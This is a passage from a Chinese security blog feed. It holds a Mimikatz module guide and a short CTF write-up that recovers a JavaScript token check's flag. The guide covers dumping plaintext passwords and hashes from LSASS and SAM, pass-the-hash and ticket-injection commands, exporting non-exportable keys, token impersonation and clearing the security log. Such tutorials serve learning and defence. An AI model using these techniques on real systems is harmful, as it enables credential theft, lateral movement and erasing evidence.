<p>注：但是在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行</p>
<p>参考文章:<a href="https://cloud.tencent.com/developer/article/1683140">Mimikatz 用法详解 - 云+社区 - 腾讯云 (tencent.com)</a></p>
<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211029161557630.png" class title="image-20211029161557630">









<h2 id="privilege"><a href="#privilege" class="headerlink" title="privilege"></a>privilege</h2><hr>
<p>通过id来确定权限 ，debug是20，driver是 10</p>
<h3 id="privilege-debug"><a href="#privilege-debug" class="headerlink" title="privilege::debug"></a>privilege::debug</h3><p>提升为debug权限，id转换为20</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211028180907459.png" class title="image-20211028180907459">



<h3 id="privilege-id-number"><a href="#privilege-id-number" class="headerlink" title="privilege::id  $number$"></a>privilege::id  $number$</h3><p>id值在1到 20之间</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211028181549132.png" class title="image-20211028181549132">



<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><hr>
<p>导出未标记为可导出的 证书。一般私钥会被标记为不可导出，使用这个参数可以给系统打patch，之后就可以导出了</p>
<h3 id="crypto-providers"><a href="#crypto-providers" class="headerlink" title="crypto::providers"></a>crypto::providers</h3><p>查看加密 提供者。 一般有 CryptoAPI和 CNG 两种，其重CNG较为古老</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211028183434518.png" class title="image-20211028183434518">



<h3 id="crypto-stores"><a href="#crypto-stores" class="headerlink" title="crypto::stores"></a>crypto::stores</h3><p>证书存储。windows 系统中有很多证书存储，默认的是CURRENT_USER 这个证书存储。</p>
<p>可以通过查询证书存储子下的所有存储证书</p>
<p>命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crypto::stores /systemstore::证书存储名称</span><br></pre></td></tr></table></figure>

<p>比如local_machine证书存储,</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211028192253999.png" class title="image-20211028192253999">



<h3 id="crypto-certificates"><a href="#crypto-certificates" class="headerlink" title="crypto::certificates"></a>crypto::certificates</h3><p>查看子存储存在的证书(默认为系统存储Current_User下的子存储MY)</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211028193029086.png" class title="image-20211028193029086">



<h4 id="查询证书"><a href="#查询证书" class="headerlink" title="查询证书"></a>查询证书</h4><p>后面跟着&#x2F;store:子存储证书名称(当前证书存储位置是由前一个命令获取存储证书位置来决定的)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crypto:certificates /store:Root(子存储位置)</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211028193345511.png" class title="image-20211028193345511">



<h4 id="导出证书"><a href="#导出证书" class="headerlink" title="导出证书"></a>导出证书</h4><p>Mimikatz不仅可以查询证书，还能将数据库中的证书导出(在Mimikatz目录下保存)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crypto::certificates/store:Root(子存储) /export</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211028194234708.png" class title="image-20211028194234708">



<p>导出的公钥是DER格式的，私钥是PFX格式的，密码是mimikatz</p>
<h3 id="cypto-capi"><a href="#cypto-capi" class="headerlink" title="cypto::capi"></a>cypto::capi</h3><p>可以使用该命令给CryptoAPI打补丁，然后就支持CryptoAPI导出</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211028194531013.png" class title="image-20211028194531013">



<h3 id="crypto-cng"><a href="#crypto-cng" class="headerlink" title="crypto::cng"></a>crypto::cng</h3><p>打cng补丁</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211028203725366.png" class title="image-20211028203725366">



<h3 id="crypto-sc"><a href="#crypto-sc" class="headerlink" title="crypto::sc"></a>crypto::sc</h3><p>列出智能读卡器</p>
<h3 id="crypto-keys"><a href="#crypto-keys" class="headerlink" title="crypto::keys"></a>crypto::keys</h3><p>读取密钥，会列举出CryptoAPI和CNG密钥</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211028204138319.png" class title="image-20211028204138319">



<p>可以看到有三个子选项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Provider</span><br><span class="line"></span><br><span class="line">Provider type</span><br><span class="line"></span><br><span class="line">CNG Provider</span><br></pre></td></tr></table></figure>

<p>使用&#x2F;provider查看所有用户的密钥</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211028210116946.png" class title="image-20211028210116946">



<p>使用&#x2F;export导出密钥，PVK files这个格式并不是我们平常的pem 格式，我们需要进一步转换</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211028212205333.png" class title="image-20211028212205333">



<p>转化命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl rsa –inform pvk –in key.pvk–outform pem –out key.pem</span><br></pre></td></tr></table></figure>



<h2 id="sekurlsa"><a href="#sekurlsa" class="headerlink" title="sekurlsa"></a>sekurlsa</h2><hr>
<p>从lsass进程中提取passwords、keys、pin、tickets等信息</p>
<p>注意，既然是从内存中读取，那么就不会去SAM<a href="https://cloud.tencent.com/solution/database?from=10680">数据库</a>读取，所以SAM数据库临时改动，只要内存中没有，那就读取不到</p>
<p>有如下命令:</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211029103412193.png" class title="image-20211029103412193">



<h3 id="sekurlsa-msv"><a href="#sekurlsa-msv" class="headerlink" title="sekurlsa::msv"></a>sekurlsa::msv</h3><p>获取主机Hash值</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211029105750418.png" class title="image-20211029105750418">



<h3 id="sekurlsa-wdigest"><a href="#sekurlsa-wdigest" class="headerlink" title="sekurlsa::wdigest"></a>sekurlsa::wdigest</h3><p>通过可逆的方式去读取明文密码</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211029110012570.png" class title="image-20211029110012570">



<h3 id="sekurlsa-Kerberos"><a href="#sekurlsa-Kerberos" class="headerlink" title="sekurlsa::Kerberos"></a>sekurlsa::Kerberos</h3><p>假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211029110051172.png" class title="image-20211029110051172">



<h3 id="sekurlsa-tspkg"><a href="#sekurlsa-tspkg" class="headerlink" title="sekurlsa::tspkg"></a>sekurlsa::tspkg</h3><p>通过tspkg读取明文密码</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211029110121290.png" class title="image-20211029110121290">



<h3 id="sekurlsa-livessp"><a href="#sekurlsa-livessp" class="headerlink" title="sekurlsa::livessp"></a>sekurlsa::livessp</h3><p>通过livessp读取明文密码</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211029110148645.png" class title="image-20211029110148645">



<h3 id="sekurlsa-logonPasswords"><a href="#sekurlsa-logonPasswords" class="headerlink" title="sekurlsa::logonPasswords"></a>sekurlsa::logonPasswords</h3><p>通过以上各种方式读取明文密码</p>
<h3 id="sekurlsa-pth"><a href="#sekurlsa-pth" class="headerlink" title="sekurlsa::pth"></a>sekurlsa::pth</h3><p>可以直接用hash来进行登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator/domain:host1 /ntlm:cdf34cda4e455232323xxxx</span><br><span class="line"></span><br><span class="line">sekurlsa::pth /user:administrator/domain:host1 /aes256:cdf34cda4e455232323xxxx</span><br></pre></td></tr></table></figure>

<p>其中&#x2F;domain 如果加入了域，那就填写域名，如果没有，那就写计算机名,执行后会在本地新开一个以hash身份的命令行窗口</p>
<h2 id="kerberos"><a href="#kerberos" class="headerlink" title="kerberos"></a>kerberos</h2><hr>
<p>与kerberos协议攻击相关的模块</p>
<h3 id="kerberos-ptt"><a href="#kerberos-ptt" class="headerlink" title="kerberos::ptt"></a>kerberos::ptt</h3><p>将票据注入内存。票证传递。通常用于注入窃取或伪造的 Kerberos 票证（黄金票证&#x2F;白银票证&#x2F;信任票证）</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031234932540.png" class title="image-20211031234932540">



<h3 id="kerberos-list"><a href="#kerberos-list" class="headerlink" title="kerberos::list"></a>kerberos::list</h3><p>列出所有的ticket票据</p>
<h3 id="Kerberos-tgt"><a href="#Kerberos-tgt" class="headerlink" title="Kerberos::tgt"></a>Kerberos::tgt</h3><p>获取主机上的票据认证票据</p>
<h3 id="kerberos-purge"><a href="#kerberos-purge" class="headerlink" title="kerberos:;purge"></a>kerberos:;purge</h3><p>清除内存中的票据</p>
<h3 id="kerberos-golden"><a href="#kerberos-golden" class="headerlink" title="kerberos::golden"></a>kerberos::golden</h3><p>获取主机上的黄金票据</p>
<h3 id="kerberos-hash"><a href="#kerberos-hash" class="headerlink" title="kerberos::hash"></a>kerberos::hash</h3><p>获取主机上所有Hash密钥</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031163020991.png" class title="image-20211031163020991">



<h3 id="kerberos-clist"><a href="#kerberos-clist" class="headerlink" title="kerberos::clist"></a>kerberos::clist</h3><h2 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h2><hr>
<h3 id="process-list"><a href="#process-list" class="headerlink" title="process::list"></a>process::list</h3><p>列出进程列表</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211029114318168.png" class title="image-20211029114318168">



<p>process::exports</p>
<p>导入进程</p>
<p>process::imports</p>
<p>导出进程</p>
<h3 id="process-start"><a href="#process-start" class="headerlink" title="process::start"></a>process::start</h3><p>开始一个进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">process:start [/paused]  [/sudo] commande</span><br></pre></td></tr></table></figure>



<h3 id="process-stop"><a href="#process-stop" class="headerlink" title="process::stop"></a>process::stop</h3><p>暂停一个程序</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211029114951284.png" class title="image-20211029114951284">



<h3 id="process-suspend"><a href="#process-suspend" class="headerlink" title="process::suspend"></a>process::suspend</h3><p>冻结一个进程</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211029114900875.png" class title="image-20211029114900875">



<h3 id="process-resume"><a href="#process-resume" class="headerlink" title="process::resume"></a>process::resume</h3><p>从冻结中恢复</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211029115017551.png" class title="image-20211029115017551">



<h3 id="process-run"><a href="#process-run" class="headerlink" title="process::run"></a>process::run</h3><p>运行进程</p>
<h3 id="process-runp"><a href="#process-runp" class="headerlink" title="process::runp"></a>process::runp</h3><p>查看mimikatz使用的模块</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211029161425608.png" class title="image-20211029161425608">



<h2 id="lsadump"><a href="#lsadump" class="headerlink" title="lsadump"></a>lsadump</h2><hr>
<p>通过查询SAM数据库来读取HASH</p>
<h3 id="lsadump-sam"><a href="#lsadump-sam" class="headerlink" title="lsadump::sam"></a>lsadump::sam</h3><p>导出SAM的Hash值</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211029161746800.png" class title="image-20211029161746800">



<h3 id="lsamdump-setntlm"><a href="#lsamdump-setntlm" class="headerlink" title="lsamdump::setntlm"></a>lsamdump::setntlm</h3><h2 id="service"><a href="#service" class="headerlink" title="service"></a>service</h2><p>列出服务管理</p>
<h3 id="service-list"><a href="#service-list" class="headerlink" title="service::list"></a>service::list</h3><p>列出当前服务</p>
<h3 id="service-1"><a href="#service-1" class="headerlink" title="service::+"></a>service::+</h3><p>mimikatz 将自己注册为一个系统服务，这样每次系统起来就会自动运行了</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031154423172.png" class title="image-20211031154423172">



<h3 id="service-2"><a href="#service-2" class="headerlink" title="service::-"></a>service::-</h3><p>停止并删除mimikatzsvc服务</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031154526142.png" class title="image-20211031154526142">





<h2 id="ts"><a href="#ts" class="headerlink" title="ts"></a>ts</h2><hr>
<p>终端服务 terminal service</p>
<h3 id="ts-multirdp"><a href="#ts-multirdp" class="headerlink" title="ts::multirdp"></a>ts::multirdp</h3><p>默认非服务器系统，windows只允许一个用户登录，也就是说如果我让别人远程登录我的电脑，那么我就不能操作了</p>
<p>这个命令可以让其支持多个用户同时在线</p>
<h3 id="ts-sessions"><a href="#ts-sessions" class="headerlink" title="ts::sessions"></a>ts::sessions</h3><p>可以查看当前登录用户的登录信息</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031154750092.png" class title="image-20211031154750092">

<p>可以看到当前的登录sessions的相关信息，并且每个session都有编号。可以看到Session的状态，登录用户，连接登录时间等会话相关信息。</p>
<h3 id="ts-remote-x2F-id-1"><a href="#ts-remote-x2F-id-1" class="headerlink" title="ts::remote &#x2F;id:1"></a>ts::remote &#x2F;id:1</h3><p>此时会跳出当前用户的账号，在主界面可以看到session为1的那个账号的已经登录了，我们输入密码可以看到他的登录信息，比如他在打开哪些文件</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031155311474.png" class title="image-20211031155311474">



<h2 id="event"><a href="#event" class="headerlink" title="event"></a>event</h2><hr>
<p>关于日志的操作，比如清空安全日志中的所有日志</p>
<p>日志信息有很多，其中比较重要的是安全日志，其中包含xx在xx时间登录了</p>
<h3 id="event-clear"><a href="#event-clear" class="headerlink" title="event:clear"></a>event:clear</h3><p>清空安全日志</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031155348440.png" class title="image-20211031155348440">



<h3 id="event-drop"><a href="#event-drop" class="headerlink" title="event:drop"></a>event:drop</h3><p>避免新的日志继续产生（现在效果还不好，是一个试验性的功能）</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><hr>
<p>杂项功能</p>
<h3 id="misc-cmd"><a href="#misc-cmd" class="headerlink" title="misc::cmd"></a>misc::cmd</h3><p>开启命令处理器</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031155537674.png" class title="image-20211031155537674">



<h3 id="misc-regedit"><a href="#misc-regedit" class="headerlink" title="misc::regedit"></a>misc::regedit</h3><p>打开计算机注册表编辑器</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031155708066.png" class title="image-20211031155708066">



<h3 id="misc-taskmgr"><a href="#misc-taskmgr" class="headerlink" title="misc::taskmgr"></a>misc::taskmgr</h3><p>打开系统任务管理器</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031155837254.png" class title="image-20211031155837254">



<h3 id="misc-clip"><a href="#misc-clip" class="headerlink" title="misc::clip"></a>misc::clip</h3><p>监听剪切板，可以看到剪切板中的复制剪切的内容</p>
<p>执行之后会一直监听着，直到我们输入Ctrl+c停止该模块</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031155954031.png" class title="image-20211031155954031">





<h2 id="dpapi"><a href="#dpapi" class="headerlink" title="dpapi"></a>dpapi</h2><hr>
<p>基于密码系统级别的应用数据保护服务（密码／私钥）</p>
<p>支持以上使用数据保护的服务</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031160213750.png" class title="image-20211031160213750">



<h3 id="dpapi-protect"><a href="#dpapi-protect" class="headerlink" title="dpapi::protect"></a>dpapi::protect</h3><img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031160401467.png" class title="image-20211031160401467">



<h3 id="dpapi-ssh"><a href="#dpapi-ssh" class="headerlink" title="dpapi::ssh"></a>dpapi::ssh</h3><p>查看客户端SSH注册记录</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031161232541.png" class title="image-20211031161232541">





<h2 id="token"><a href="#token" class="headerlink" title="token"></a>token</h2><hr>
<p>查看用户令牌</p>
<h3 id="token-whoami"><a href="#token-whoami" class="headerlink" title="token::whoami"></a>token::whoami</h3><p>查看你是who，当前操作用户</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031161513486.png" class title="image-20211031161513486">



<h3 id="token-list"><a href="#token-list" class="headerlink" title="token::list"></a>token::list</h3><p>列出都有哪些登录了的账号</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031161611130.png" class title="image-20211031161611130">



<h3 id="token-elevate-x2F-domain-域名"><a href="#token-elevate-x2F-domain-域名" class="headerlink" title="token::elevate &#x2F;domain(域名)"></a>token::elevate &#x2F;domain(域名)</h3><p>假如domain域存在，我们可以假冒成为域管理员的token</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031161702476.png" class title="image-20211031161702476">



<h3 id="token-revert"><a href="#token-revert" class="headerlink" title="token::revert"></a>token::revert</h3><p>取消之前假冒的令牌，回到起初登录用户的令牌</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031161737723.png" class title="image-20211031161737723">



<h3 id="token-run"><a href="#token-run" class="headerlink" title="token::run"></a>token::run</h3><p>显示当前用户进程的相关信息</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031162006155.png" class title="image-20211031162006155">



<h2 id="vault"><a href="#vault" class="headerlink" title="vault"></a>vault</h2><hr>
<h3 id="vault-list"><a href="#vault-list" class="headerlink" title="vault::list"></a>vault::list</h3><p>列出所有系统品证，包括Windows凭证和Web凭证</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031162143549.png" class title="image-20211031162143549">



<h3 id="vault-cred"><a href="#vault-cred" class="headerlink" title="vault::cred"></a>vault::cred</h3><p>查看系统凭据。可以看到保存在系统上的所有凭证，比如github,Microsft等相关凭证</p>
<img src="/2022/05/15/mimikatz%E4%BD%BF%E7%94%A8/image-20211031162335610.png" class title="image-20211031162335610">
]]></content>
      <categories>
        <category>内网渗透</category>
        <category>渗透工具</category>
      </categories>
      <tags>
        <tag>-内网渗透 -工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Crypto系列之flag_in_hand</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Crypto%E7%B3%BB%E5%88%97%E4%B9%8Bflag_in_hand/</url>
    <content><![CDATA[<h1 id="【攻防世界】Crypto系列之flag-in-hand"><a href="#【攻防世界】Crypto系列之flag-in-hand" class="headerlink" title="【攻防世界】Crypto系列之flag_in_hand"></a>【攻防世界】Crypto系列之flag_in_hand</h1><p>这道题是个web页面，随便输入字符进行测试</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Crypto%E7%B3%BB%E5%88%97%E4%B9%8Bflag_in_hand/image-20231127144357147.png" class title="image-20231127144357147">

<p>这里的字符串不是flag哈！</p>
<p>我们查看页面源代码，代码如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Flag in your Hand<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">			<span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="css">				<span class="attribute">padding-left</span>: <span class="number">30%</span>;</span></span><br><span class="line"><span class="css">			&#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">			<span class="selector-id">#flag</span> &#123;</span></span><br><span class="line"><span class="css">				<span class="attribute">font-family</span>: Garamond, serif;</span></span><br><span class="line"><span class="css">				<span class="attribute">font-size</span>: <span class="number">36px</span>;</span></span><br><span class="line"><span class="css">			&#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">			<span class="selector-id">#flagtitle</span> &#123;</span></span><br><span class="line"><span class="css">				<span class="attribute">font-family</span>: Garamond, serif;</span></span><br><span class="line"><span class="css">				<span class="attribute">font-size</span>: <span class="number">24px</span>;</span></span><br><span class="line"><span class="css">			&#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">			<span class="selector-class">.rightflag</span> &#123;</span></span><br><span class="line"><span class="css">				<span class="attribute">color</span>: green;</span></span><br><span class="line"><span class="css">			&#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">			<span class="selector-class">.wrongflag</span> &#123;</span></span><br><span class="line"><span class="css">				<span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="css">			&#125;</span></span><br><span class="line"><span class="css">		</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;script-min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> ic = <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> fg = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">			<span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">				<span class="keyword">var</span> token = <span class="built_in">document</span>.getElementById(<span class="string">&quot;secToken&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">				ic = checkToken(token);</span></span><br><span class="line"><span class="javascript">				fg = bm(token);</span></span><br><span class="line"><span class="javascript">				showFlag()</span></span><br><span class="line"><span class="javascript">			&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">			<span class="function"><span class="keyword">function</span> <span class="title">showFlag</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">				<span class="keyword">var</span> t = <span class="built_in">document</span>.getElementById(<span class="string">&quot;flagTitle&quot;</span>);</span></span><br><span class="line"><span class="javascript">				<span class="keyword">var</span> f = <span class="built_in">document</span>.getElementById(<span class="string">&quot;flag&quot;</span>);</span></span><br><span class="line"><span class="javascript">				t.innerText = !!ic ? <span class="string">&quot;You got the flag below!!&quot;</span> : <span class="string">&quot;Wrong!&quot;</span>;</span></span><br><span class="line"><span class="javascript">				t.className = !!ic ? <span class="string">&quot;rightflag&quot;</span> : <span class="string">&quot;wrongflag&quot;</span>;</span></span><br><span class="line"><span class="javascript">				f.innerText = fg;</span></span><br><span class="line"><span class="javascript">			&#125;</span></span><br><span class="line"><span class="javascript">		</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>Flag in your Hand<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span>Type in some token to get the flag.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span>Tips: Flag is in your hand.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">span</span>&gt;</span>Token:<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;secToken&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Get flag!&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;getFlag()&quot;</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;flagTitle&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里有两个关键的函数对flag进行操作</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">function getFlag() &#123;</span><br><span class="line">				var token = document.getElementById(&quot;secToken&quot;).value;</span><br><span class="line">				ic = checkToken(token);</span><br><span class="line">				fg = bm(token);</span><br><span class="line">				showFlag()</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			function showFlag() &#123;</span><br><span class="line">				var t = document.getElementById(&quot;flagTitle&quot;);</span><br><span class="line">				var f = document.getElementById(&quot;flag&quot;);</span><br><span class="line">				t.innerText = !!ic ? &quot;You got the flag below!!&quot; : &quot;Wrong!&quot;;</span><br><span class="line">				t.className = !!ic ? &quot;rightflag&quot; : &quot;wrongflag&quot;;</span><br><span class="line">				f.innerText = fg;</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<p>getflag()代码获取我们输入的token字符串，通过checkToken()和bm()进行处理，而showFlag()中判断的是ic是否为true，若为true则输出</p>
<p>我们在script.js中查看ic的值变换，代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function ck(s) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        ic</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    var a = [118, 104, 102, 120, 117, 108, 119, 124, 48,123,101,120];</span><br><span class="line">    if (s.length == a.length) &#123;</span><br><span class="line">        for (i = 0; i &lt; s.length; i++) &#123;</span><br><span class="line">            if (a[i] - s.charCodeAt(i) != 3)</span><br><span class="line">                return ic = false;</span><br><span class="line">        &#125;</span><br><span class="line">        return ic = true;</span><br><span class="line">    &#125;</span><br><span class="line">    return ic = false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只要满足<strong>a[i] - s.charCodeAt(i) &#x3D; 3</strong>则ic&#x3D;true，只需根据这个反推回正确的flag即可</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">118</span>, <span class="number">104</span>, <span class="number">102</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">108</span>, <span class="number">119</span>, <span class="number">124</span>, <span class="number">48</span>,<span class="number">123</span>,<span class="number">101</span>,<span class="number">120</span>]</span><br><span class="line">b = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    b+=<span class="built_in">chr</span>(i-<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#b=security-xbu</span></span><br></pre></td></tr></table></figure>

<p>在网页中提交token，返回flag</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Crypto%E7%B3%BB%E5%88%97%E4%B9%8Bflag_in_hand/image-20231127150204021.png" class title="image-20231127150204021">

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RenIbyd8Fgg5hawvQm7TDQ</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>-CTF -Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Crypto系列之baigeiRSA</title>
